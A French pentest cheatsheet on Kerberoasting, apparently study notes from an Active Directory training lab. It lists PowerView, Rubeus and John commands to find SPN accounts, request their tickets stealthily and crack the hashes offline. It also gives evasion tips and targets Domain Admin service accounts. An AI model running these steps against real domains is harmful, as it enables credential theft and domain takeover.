# Cheatsheet - Kerberoasting

> [!summary] Objectif
> Un compte *user* portant un SPN peut voir son TGS demandé par n'importe quel utilisateur du domaine, puis cracké offline (le TGS est chiffré avec le hash du compte de service). Aucun privilège requis — souvent un chemin direct vers Domain Admin.

> [!warning]- Required
> N'importe quel compte de domaine valide (aucune élévation) + au moins un compte *user* portant un SPN dans l'annuaire.

### Find SPN accounts

```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

Viser les comptes **user** : les comptes **machine** ont des mots de passe aléatoires incassables. Un compte de service membre de *Domain Admins* (ex. `svcadmin`) = jackpot.

### Request the TGS

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

`/rc4opsec` ne demande que les comptes supportant RC4 → évite de forcer un downgrade détectable sur un compte AES-only (au risque de le rater). Sans contrainte de furtivité : `/rc4`.

### Crack

```powershell
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

> [!important] Avant John : retirer le port (`:1433`) du SPN dans `hashes.txt`, sinon le hash ne se charge pas.
> `...MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*` → `...moneycorp.local*`

## Related
[[Cheatsheet - AS-REP Roasting]] · [[Cheatsheet - Tickets Kerberos]] · [[Cheatsheet - MSSQL et PowerUpSQL]] · [[Synthèse - Kerberos]]
